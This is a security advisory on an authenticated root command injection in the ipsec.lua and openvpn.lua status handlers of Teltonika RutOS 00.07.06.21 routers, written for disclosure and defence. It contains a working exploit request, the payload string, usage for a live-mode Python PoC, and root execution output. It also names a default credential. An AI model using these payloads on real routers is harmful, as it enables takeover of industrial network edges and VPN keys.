# Teltonika RutOS 00.07.06.21 (RUT2XX / RUT200 + RUT9XX) — Authenticated Command Injection in the `ipsec.lua` `instances_status()` logread Sink Yields Root RCE With Reflected Output

## 1. Overview

Teltonika Networks (Lithuania) ships the RUT2XX/RUT200 family of industrial 4G/LTE routers running RutOS, an OpenWrt-derived firmware. The researched build is `RUT2_R_00.07.06.21_WEBUI.bin` (RutOS 00.07.06.21), a MIPS32 big-endian, musl soft-float image whose management plane is a uhttpd server fronting three interfaces: a VuCI Lua REST API under `/api` (177 modules), MIPS CGI binaries under `/cgi-bin`, and ubus-over-HTTP under `/ubus`.

This advisory documents an authenticated OS command injection (CWE-78) in the `/api` Lua REST stack. The `status` handler of the `ipsec` service module builds a `logread` command line by concatenating the caller-supplied `sid` path segment **twice** into a single-quoted shell argument, and never passes it through the `vuci.util.shellquote()` helper that the same framework ships and uses correctly elsewhere. Because `vuci.util.exec()` reduces to `io.popen(cmd):read("*a")` — `/bin/sh -c cmd` — a single quote inside `sid` closes the quoted argument and everything after it is parsed as new shell commands. uhttpd runs as root with no user-drop directive, so the injected command executes as **root**, and its stdout is returned to the caller in the JSON response `.logs` field. The injection is not blind: command output comes straight back in the HTTP response.

The research proceeded in four stages, which the sections below follow. **Surface discovery**: the firmware's Lua layer is a *patched* Lua 5.1 bytecode format that defeats stock decompilers, and recovering it (211/211 files) was a hard prerequisite to any source-level work (§3.3). **Authentication-boundary narrowing**: an unauthenticated RCE was actively hunted across all three interfaces and **NOT** found — the `/api` JWT gate holds and the unauthenticated allowlist is sink-free (§4). **Sink localization**: every `vuci.util.exec` call site reachable from the Lua API was audited and classified by whether its attacker-controlled argument was shellquoted, reducing the field to exactly two unprotected sinks (§5). **Chain construction and dynamic verification**: the URL-to-shell flow was traced over eight links and executed against the *real device code* under QEMU MIPS inside the extracted rootfs, yielding a `uid=0(root)` marker and a reflected `id` (§6, §8).

A second sink with an identical root cause sits in a different file and function (`openvpn.lua:1660`) and is documented as a same-root-cause sibling, not a separate finding. Byte-identity evidence ties the RUT9XX family to the same vulnerable source; §9 explains why both families are reported as ONE advisory.

## 2. Vulnerability Summary

| Item | Value |
|---|---|
| Type | OS command injection, post-authentication (CWE-78) |
| Vector | `GET /api/ipsec/status/<payload>` with `Authorization: Bearer <JWT>` |
| Sink | `ipsec.lua` `instances_status()` -> `vuci.util.exec("logread -e '<sid>-<sid>_c\|'")`, `sid` not shellquoted |
| Sibling sink (same root cause) | `openvpn.lua:1660` -> `string.format("logread -e %s", sid)`, `sid` not shellquoted |
| Execution privilege | **root** (uhttpd runs as root by default; no user-drop directive) |
| Output reflection | Yes — `exec()` stdout lands in the response JSON `.data.logs` field (non-blind RCE) |
| CVSS | **8.8** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| Affected | RutOS 00.07.06.21 — RUT2XX/RUT200, plus RUT9XX by byte-identity (§9) |
| Prior CVE coverage | None for this sink. CVE-2023-32350 is the `packages.lua` package-name injection (different file, different function, already shellquoted); CVE-2023-32349 is the `cgi-tcpdump` filter (different component, MIPS CGI) |

## 3. Product, Firmware & Architecture

**Product**: Teltonika Networks (Lithuania) RUT2XX / RUT200 industrial 4G/LTE router, CII/OT deployment class. **Firmware**: RutOS 00.07.06.21, image `RUT2_R_00.07.06.21_WEBUI.bin`, OpenWrt-derived, squashfs rootfs (35 MB extracted). **Architecture**: MIPS32 big-endian (MSB), musl soft-float — binwalk misreports the squashfs as little-endian, but the ELF header (byte 5 = `0x02`) and `file` confirm BE, so every dynamic step ran under a big-endian user-mode emulator. **CVE posture at research time**: effectively a blue ocean; no CVE covers this `ipsec.lua` sink.

### Attack surface (3.1): web management plane

From `etc/config/uhttpd`: `listen_http` 80, `listen_https` 443, `home /www`, `cgi_prefix /cgi-bin`; `lua_prefix '/api=/www/cgi-bin/api_dispatcher.lua'` sends everything under `/api/*` into the VuCI Lua REST stack; `ubus_prefix '/ubus'` exposes ubus over HTTP; and `_httpWanAccess=0` / `_httpsWanAccess=0` leave WAN-side web access disabled by default (LAN-reachable). The three resulting entry points are gated differently: `/api` (VuCI Lua REST, 177 modules) requires a JWT bearer token; `/cgi-bin` (MIPS cgi-io, post_get) enforces a per-operation `session.access` check; and `/ubus` restricts its anonymous ACL to `session.login` and `session.access`.

### 3.2 Recovering the Lua layer (surface-discovery blocker)

Teltonika ships a **patched Lua 5.1**, so stock decompilers reject the bytecode outright. Two format deviations had to be reverse-engineered: (1) the header integrality byte at offset `0x0B` is `4` instead of the stock value — patching `unluac` to accept it recovered 49 of 211 files; (2) a custom constant tag `9` encodes a **4-byte integer** (hexdump evidence at offset 1030: `09 fd 00 00 00 04`) — patching `unluac`'s `LConstantType50` to handle case 9 via `new LNumberType(4, true, MODE_INTEGER).parse()` recovered the rest, reaching **211/211 files decompiled**. Only then did the 177 REST modules and their `exec` call sites become auditable.

## 4. Authentication Boundary

`dispatcher_lib.lua:validate_request` requires a JWT bearer token (a three-part `.`-splitted string) by default; token validation lives in `authentication.lua:30-35` (`api.jwt.validateToken`). Two properties of that gate matter:

- **It holds.** No bypass was found. The `/api` unauthenticated allowlist — `/unauthorized/status`, `/login`, `/jwt_login`, `/refresh`, `/logout`, `/bulk`, `/session/status`, `/general` (characterized in the research record as 5-8 paths) — was audited in full and is **entirely sink-free**. `/login` merely forwards to `ubus("session", "login", {username, password})`, standard OpenWrt PAM authentication.
- **It does not constrain content.** The gate validates the token but performs no validation on the `service_group` or `sid` path segments. Any authenticated caller can place arbitrary bytes in `sid`.

The unauthenticated-RCE objective (Target A) was **not achieved**, and this advisory makes no such claim. Narrowing was exhaustive across all three stacks: `/api` allowlist sink-free (above); `/ubus` anonymous ACL covers only `session.login` and `session.access`; `/cgi-bin/cli` is a shellinaboxd PAM login prompt, not an unauthenticated shell; `cgi-io` / `post_get` put every operation behind a `session.access` gate. One boundary observation is recorded for completeness: the firmware ships a default credential `admin01` (CWE-798), but it is mitigated by a forced password change at first login and is not an independent RCE primitive — its only relevance is that it lowers the bar for obtaining the JWT this chain requires. What follows is strictly **post-authentication**.

## 5. Root-Cause Analysis

### 5.1 The two framework helpers

The whole Lua API funnels shell execution through one primitive, `vuci.util.exec` at `vuci/util.lua:779`: `io.popen(cmd):read("*a")` — equivalent to `/bin/sh -c cmd`. The same framework ships a canonical, correct quoting helper at `vuci/util.lua:100` — `string.format("'%s'", string.gsub(s,"'","'\\''"))`. That helper is the security control, so exploitability of any call site reduces to one question: *did the author pass the attacker-controlled argument through it?* A per-file sweep answered it:

| Module | Construction | Verdict |
|---|---|---|
| `diagnostics.lua` (anchored PCRE2 `^...$` host check) and `backup.lua` (constant path `A0_57`) | not attacker-controlled at the sink | blocked |
| `packages.lua:109` | `"opkg install " .. shellquote(pkg)` | safe — the CVE-2023-32350 fix |
| `profiles.lua`, `firmware.lua`, `network.lua:1402` | shellquoted or fixed command strings | blocked |
| **`ipsec.lua:934`** | `logread -e '<sid>-<sid>_c\|'` — **`sid` not shellquoted** | **injectable** |
| **`openvpn.lua:1660`** | `string.format("logread -e %s", sid)` — **`sid` not shellquoted** | **injectable** |

### Sink identification (5.2): the logread exec call

`ipsec.lua` `instances_status()` assembles the command from six decompiled locals (the constant-assembly block spans lines 936-941). The attacker-controlled `sid` is `A1_289`, concatenated **twice**:

```lua
L11_299 = _UPVALUE0_.exec           -- _UPVALUE0_ = vuci, exec = vuci.util.exec
L12_300 = "logread -e '<"
L13_301 = A1_289                    -- sid (attacker-controlled, no shellquote)
L14_302 = "-"
L15_303 = A1_289                    -- sid again
L16_304 = "_c|'"
L12_300 = L12_300 .. L13_301 .. L14_302 .. L15_303 .. L16_304
L11_299 = L11_299(L12_300)          -- exec("logread -e '<sid>-<sid>_c|'")
```

The root cause is exactly that `L13_301` and `L15_303` are raw `sid` values. The template opens a single quote before the first and closes it after the second, so the author clearly intended `sid` to sit *inside* a quoted argument — but nothing enforces that. A `sid` containing `'` closes the quote early and the shell resumes normal parsing on attacker-controlled text. The second copy doubles the injection opportunity and makes the injected command run twice. Reachability is amplified by a second defect: the sink fires *before* any existence check. In `ipsec.lua:GET_TYPE_status` (around line 1003):

```lua
L0_0:new().GET_TYPE_status = function(A0_313)
  local L1_314 = A0_313._single
  if L1_314 then
    L1_314 = A0_313.instances_status
    L1_314 = L1_314(A0_313, A0_313.sid)   -- SINK call, ahead of the existence check
    if L1_314 then
      return A0_313:ResponseOK(L1_314)
    else
      return A0_313:ResponseNotFound("Section not found")   -- check happens after the sink
    end
```

`instances_status()` is invoked unconditionally whenever `_single` is set. Even if no matching ipsec section exists — even if IPSec is not configured at all — the `logread` command is still built and executed, and only afterwards does the handler consider returning `Section not found`. The existence question provides no protection because it is asked too late.

The injection is not blind: at `ipsec.lua` around line 970 the captured output is stored straight into the response object, `L19_307.logs = L11_299`. Since `io.popen(cmd):read("*a")` returns *all* stdout of the composed shell line — the injected commands' output, not merely `logread`'s — that value becomes `.data.logs` in the HTTP JSON response.

### 5.3 The sibling sink

`openvpn.lua:1660` carries the same root cause in a different file and function, and is sloppier still — there are no surrounding quotes at all: `string.format("logread -e %s", sid)`. An attacker needs no quote-breakout; a bare `;` suffices. Same product, same firmware, same root cause, same `logread` idiom, so it is documented as part of this finding.

## 6. Exploit Chain Construction

### Data flow

The complete URL-to-`/bin/sh` path, eight links:

```text
GET /api/ipsec/status/<payload>            (Authorization: Bearer <JWT>)
  1. paths_index.lua:265   ["/ipsec/{service_group}/{sid}"] = "/usr/lib/lua/api/services/ipsec"
  2. dispatcher_lib.lua    validate_request -> JWT valid (sid content never inspected)
  3. paths_register.lua    parse_url regex ^/ipsec/([^/]*)/([^/]*)$
                             service_group = "status" -> GET_TYPE_status (VuCI: service_group == type)
                             sid           = 3rd segment, URL-decoded per-segment (util.lua:1093 urldecode)
  4. dispatcher_common.lua populate_endpoint (lines 235-245): _single = true; sid copied verbatim
  5. ipsec.lua ~1003       GET_TYPE_status -> instances_status(self, self.sid) [before existence check]
  6. ipsec.lua:934         exec("logread -e '<" .. sid .. "-" .. sid .. "_c|'")  [THE SINK]
  7. vuci/util.lua:779     io.popen(cmd):read("*a")  ->  /bin/sh -c cmd          [root]
  8. ipsec.lua ~970        result.logs = exec-output -> HTTP JSON .data.logs     [REFLECTED]
```

Links 3 and 4 decide whether a payload survives the journey. The dispatcher copies `sid` with no validation (`if A4_46.sid then A2_44._single = true` followed by `for k,v in pairs(A4_46) do A2_44[k]=v`), and the route regex `([^/]*)` excludes only `/` — single quotes, semicolons and spaces all pass untouched. The front-end JavaScript (`www/assets/index-*.js`) confirms the endpoint's intended shape: `/api/ipsec/status` for the list, `/api/ipsec/status/<sid>` for a single instance. Now set `sid = ';id;echo '` (URL-encoded `%27;id;echo%20%27`). Substituted twice into the template:

```
logread -e '<';id;echo '-';id;echo '_c|'
```

`/bin/sh` parses this as a `;`-separated sequence: `logread -e '<'` (the legitimate part), then `id` — **the injected command, executing as root** — then `echo '-';id;echo '_c|'` (the template remainder, running the injected command a second time). The trailing `echo '` re-opens a quote so the rest of the template stays syntactically valid; both `id` invocations land in the captured stdout and therefore in `.data.logs`.

```http
GET /api/ipsec/status/%27;id;echo%20%27 HTTP/1.1
Host: <target-ip>
Authorization: Bearer <JWT>
Accept: application/json
```

The response JSON `.data.logs` contains `uid=0(root)`. To generalize, replace `id` with any command, encode spaces as `%20`, and encode a literal `/` as `%2F` (or split the command), since the route would otherwise read a slash as a segment separator.

## 7. PoC Usage

A standard-library-only Python 3 PoC ships at `exploit/teltonika_rutos_ipsec_status_logread_rce.py`, with two modes. **Self-verification** (no device needed) mirrors the decompiled sink construction in Python, runs it through `/bin/sh -c`, and shows the injected command's output landing in the captured stdout the device would return as `.logs`:

```bash
python3 exploit/teltonika_rutos_ipsec_status_logread_rce.py --verify --cmd id
```

**Live mode** logs in over `/api/login` (falling back to `/api/jwt_login`), issues the payload request, and prints the reflected output:

```bash
python3 exploit/teltonika_rutos_ipsec_status_logread_rce.py --exploit --host <target-ip> \
    --port 80 --user <user> --password <password> --cmd id          # add --https --port 443 for TLS
```

Defaults: host `127.0.0.1`, port `80`, command `id`. Commands containing `/` are rejected because the route would split the segment. Dependencies: `argparse`, `json`, `os`, `subprocess`, `sys`, `urllib` — no third-party packages. For authorized security testing and coordinated disclosure only.

## 8. Verification Evidence

### 8.1 Environment — stated exactly as it was

The decisive verification ran under **QEMU MIPS user-mode emulation against the real firmware binaries**, not on physical hardware. **Emulation**: `qemu-mips-static` (Debian `qemu-user-static` 7.2) with `binfmt_misc` registered for MIPS big-endian (`flags F`); chroot `fork`+`exec` was verified working before use. **Target code**: the squashfs rootfs extracted from RutOS 00.07.06.21 (35 MB) — the *device's own* MIPS `lua5.1`, `vuci.util.exec` and `/bin/sh`. **Lua runtime**: the patched Lua 5.1 of §3.2. **Invocation**: `chroot <rootfs> /usr/bin/qemu-mips-static /usr/bin/lua5.1 /tmp/sink_test2.lua`. **Hosts**: an x86-64 Linux machine for the QEMU work; the PoC self-verification mode was additionally run on a macOS workstation with `LC_ALL=C`.

What this proves, and what it does not. It proves the exact command string `instances_status()` constructs is interpreted by the firmware's real shell, that the quote breakout succeeds against the real `vuci.util.exec`, and that the injected command runs as root inside that firmware environment with its output captured for reflection. **The research record does not document an end-to-end HTTP attack against physical RUT2XX or RUT9XX hardware**, and no such claim is made here. The `logread: not found` lines below are an artifact of the chroot lacking the `logread` binary; they do not weaken the result, because the `;`-separated injected commands broke out and executed regardless.

### 8.2 Real `vuci.util.exec` against both sinks

`ipsec.lua:934` sink, constructed command for `sid = ';id>/tmp/rce_marker;echo '` — real return (MIPS lua -> MIPS `io.popen` -> MIPS `/bin/sh`):

```
=== EXACT CONSTRUCTED CMD (ipsec.lua:934) ===
logread -e '<';id>/tmp/rce_marker;echo '-';id>/tmp/rce_marker;echo '_c|'
=== CALLING REAL vuci.util.exec (MIPS lua + MIPS io.popen + MIPS sh) ===
/bin/sh: logread: not found
=== EXEC RETURNED ===
-
_c|

=== MARKER FILE CHECK ===
RCE_MARKER_EXISTS, content:
uid=0(root) gid=0(root) groups=0(root)
```

`/tmp/rce_marker` was written with `uid=0(root) gid=0(root) groups=0(root)`: arbitrary command execution as root, confirmed. The `openvpn.lua:1660` sibling received the same treatment with `sid = ';id>/tmp/rce_marker2;echo '` (here there are no surrounding quotes to break out of):

```
=== EXACT CONSTRUCTED CMD (openvpn.lua:1660) ===
logread -e ;id>/tmp/rce_marker2;echo
=== CALLING REAL vuci.util.exec ===
/bin/sh: logread: not found
=== MARKER FILE CHECK ===
RCE_MARKER2_EXISTS, content:
uid=0(root) gid=0(root) groups=0(root)
```

### 8.3 Reflection evidence (no file write)

With `sid = ';id;echo '` — slash-free, so it survives the route segment intact — the real `vuci.util.exec` returned:

```
CMD: logread -e '<';id;echo '-';id;echo '_c|'
/bin/sh: logread: not found
=== EXEC OUTPUT (= response .logs field, id output REFLECTED) ===
uid=0(root) gid=0(root) groups=0(root)
-
uid=0(root) gid=0(root) groups=0(root)
_c|
```

The `id` output appears **inside the return value of `exec()`**, which is precisely the value assigned to `.logs` — non-blind root RCE confirmed. The output appears twice, the direct consequence of `sid` being concatenated twice. The shipped PoC's `--verify` mode reproduces this same construction and reflection portably on a workstation shell (where the injected `id` naturally reports the local uid, e.g. `uid=501(<local-user>) gid=20(staff)`, and ends `[+] CONFIRMED: arbitrary command executed and reflected.`); root privilege is the device-side property established in §8.2.

### Source identification (8.4): route capture (URL -> `sid`)

A capture of the PoC request `GET /api/ipsec/status/%27;id;echo%20%27` yielded `PATH_INFO` `/ipsec/status/%27;id;echo%20%27` and the raw parse `service_group= status  sid_encoded= %27;id;echo%20%27`, with `sid` URL-decoded to `';id;echo '`. The `([^/]*)` group captures that string verbatim; the single quote and semicolon pass the path matcher with no rejection at any layer. Separately confirmed: `validate_request` does not inspect `sid` content, and uhttpd has no user-drop directive, so the execution user is root.

### 8.5 Independent adversarial review

Two independent adversarial agents re-examined the finding. **Re-analyst**: **CONFIRMED**, confidence **0.95**, having independently re-derived the complete URL -> `/bin/sh` flow and verified all eight links. **Falsifier**: **NOT REFUTED**, confidence **0.92** — refutation was attempted link by link and failed on each, since the sink has no existence-check precondition, `exec()` output really is reflected into `.logs`, and the auth layer really does not validate `sid`. The only correction either agent produced was to URL segment ordering: the correct path is `/api/ipsec/status/<payload>`, not a `/api/config/...` form.

Research sequence (dates are intentionally omitted from this advisory): firmware download and rootfs extraction; Lua decompilation of all 211 files; authentication-model narrowing and the sink sweep; QEMU MIPS environment build; dynamic verification CONFIRMED and adversarial review completed.

## 9. Affected Family Scope

The RUT9XX family ships the identical vulnerable code, established by byte-identity rather than inference: `ipsec.lua` in the RUT9 firmware `RUT9_R_00.07.06.21_WEBUI.bin` is **byte-identical** to the RUT2 copy — md5 `894c460ff3cece4ce0d5894199d8c07f`, confirmed **in both directions** — and **177 of 177** shared Lua modules are byte-identical between the two firmwares. Same vulnerable source, same firmware version: the two families are reported as **ONE advisory** rather than counted per family. RUT9-unique attack surface was reviewed exhaustively for independently exploitable RCE and none was found. The **36 industrial modules** (`modbus`, `io_juggler`, `gps`, `gre`) contain **zero** `exec` sinks. **cgi-io `tcp_mount`** does have an unshellquoted sink on its C path, but the Lua `SET` path applies `check_array` exact-match whitelist validation, so it is not exploitable over HTTP. **`modbusgwd`** is remotely reachable but has no command sink at all. Ruled out elsewhere for completeness: the `uscripts` / `/etc/rc.local` uploader is admin-by-design functionality rather than a vulnerability; `diagnostics` host injection is blocked by anchored PCRE2 validation; `packages.lua` already carries the CVE-2023-32350 shellquote fix. **Affected**: RUT2XX / RUT200 and RUT9XX running RutOS 00.07.06.21. Other RutOS branches shipping the same VuCI `/api` stack with the same `services/ipsec.lua` are expected to be affected, but that has not been individually confirmed and is not documented in the research record.

## 10. Reachability and Security Impact

This is an **industrial / OT-class cellular router**: root on one is root on the network path it carries.

- **Execution identity**: root, observed directly as `uid=0(root) gid=0(root) groups=0(root)`. No privilege boundary remains after authentication.
- **Network transit control**: the device is the WAN edge for whatever it serves. Root permits arbitrary manipulation of routing, NAT, firewall rules and DNS resolution — traffic can be redirected, dropped or silently intercepted for every host behind it.
- **VPN termination point**: the vulnerable handler belongs to the IPSec module and its sibling to the OpenVPN module — these devices terminate site-to-site and remote-access tunnels. Root yields tunnel configuration, pre-shared keys and certificates, so an attacker can impersonate a legitimate peer, decrypt captured traffic and pivot into networks that explicitly trusted this router. Because IPSec peers are mutually authenticated and statically configured, a compromised endpoint is among the hardest intrusions for the peer to detect.
- **Serial and I/O reach**: the RUT9XX family adds Modbus, digital I/O (`io_juggler`) and GPS. Root on the router means root on the field devices reachable through it — process data can be read and, where the router holds write access to PLCs or serial endpoints, actuated. The vulnerability documented here sits in the shared VPN modules rather than those industrial modules (§9), but post-exploitation reach extends to them.
- **Cellular WAN persistence**: root permits reconfiguring the cellular APN and WAN settings, planting persistent implants in writable partitions or startup scripts, and routing exfiltration over the cellular link — in many OT deployments the only path leaving an otherwise isolated network, and one rarely monitored.
- **No oracle needed**: output is reflected in the HTTP response, so no DNS/HTTP exfiltration channel, timing side channel or second request is required. Configuration dumps and credential theft complete in one authenticated GET that looks like an ordinary status poll.
- **Exposure profile**: management is LAN-facing by default (`_httpWanAccess=0`), limiting opportunistic internet-wide scanning — but that also describes an attacker who reached the LAN by any other means: the cellular side, a compromised VPN peer, or site access. For an OT network, converting one status API call into root on the router is a complete compromise of the network edge.

## 11. Mitigation

Vendor-side, in priority order: (1) **Quote the argument** — in `instances_status()`, pass `sid` through `vuci.util.shellquote(sid)` before concatenation; the helper already exists in the framework and is already used correctly elsewhere in the same API. (2) **Fix the sibling identically** — `openvpn.lua:1660` needs the same treatment, and being unquoted it is injectable with a bare `;`. (3) **Take the shell out of the path** — prefer a non-shell `logread` invocation (argument-array exec) over `io.popen` with a composed string, which makes the bug class unreachable rather than merely patched. (4) **Validate `sid` at the boundary** — constrain it to a legal UCI section name (`[a-zA-Z0-9_]+`) in the dispatcher, before `populate_endpoint` copies it into the endpoint object; that is the single choke point all `/api` service modules pass through, so it also protects against the defect recurring. (5) **Check existence before executing** — `GET_TYPE_status` currently calls `instances_status()` and only then asks whether the section exists; resolving and validating the UCI section first would turn a non-existent section into a clean `Section not found`. (6) **Audit the remaining `exec` call sites** across all 177 modules, since the framework makes the unsafe form as easy to write as the safe one.

Operator-side, until patched firmware is available: keep `_httpWanAccess=0` / `_httpsWanAccess=0` so the management plane stays off the WAN; segment router management onto a dedicated, tightly controlled VLAN; treat router accounts as privileged credentials and enforce the first-login password change; monitor for `/api/ipsec/status/` and `/api/openvpn/...` requests whose `sid` segment contains percent-encoded quotes (`%27`), semicolons (`%3B`) or spaces (`%20`) — none of which occur in legitimate UCI section names; and audit VPN tunnel configuration for unauthorized changes.

## 12. CWE & CVSS

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CVSS 3.1 base score**: **8.8 (High)**
- **Vector**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
  - `AV:N` reachable over the network through the HTTP management API; `AC:L` no race or special conditions — a single crafted GET, and the sink fires even when the referenced section does not exist; `UI:N` no user interaction.
  - `PR:L` a valid JWT is required (the authenticated boundary, and the absence of any unauthenticated path, are established in §4); `S:U` impact confined to the router's own security authority, which happens to be root; `C:H` / `I:H` / `A:H` root with reflected output — full read of configuration, keys and transit traffic, full write to routing, firewall and VPN state, full availability control over the network edge.

- Related but distinct: **CWE-798** (use of hard-coded credentials) is noted in §4 for the shipped `admin01` default and is explicitly *not* claimed as part of this finding.

Contact: `disclosure@0day-rubbish.com`.

*This advisory will be published at https://0day-rubbish.com/blog/teltonika-rutos-ipsec-status-logread-command-injection as part of batch-11. Disclosure status is tracked in DISCLOSURE-STATUS.md.*
